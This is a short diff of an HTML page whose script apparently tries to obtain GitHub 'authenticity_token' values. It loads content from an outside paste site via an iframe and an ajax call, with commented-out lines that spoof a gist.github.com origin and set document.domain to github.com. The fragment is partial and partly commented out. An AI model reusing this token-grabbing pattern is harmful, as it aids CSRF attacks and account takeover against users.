@@ -88,9 +88,9 @@ function ()
 </head>
 <body>
 <div id="content"></div>
-<iframe id="iframe0"  src="https://textuploader.com/d0gvs/raw">
+
 <script language=javascript>
-//document.domain = "github.com";
+//document.domain = "github.com";   <iframe id="iframe0"  src="https://textuploader.com/d0gvs/raw">
 function gettoken(){
  $.ajax({
    url:'http://textuploader.com/d0gvs/raw',
@@ -104,7 +104,7 @@ function gettoken(){
     'origin':'https://gist.github.com',
     'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept',
     'Content-Type': 'application/x-www-form-urlencoded'
-    },	*/ 
+    },*/ 
    success: function(data) {
        //var content = $('<div>').append(data).find('[name="authenticity_token"]');//  ('#content');
        //$('#content').html( content );
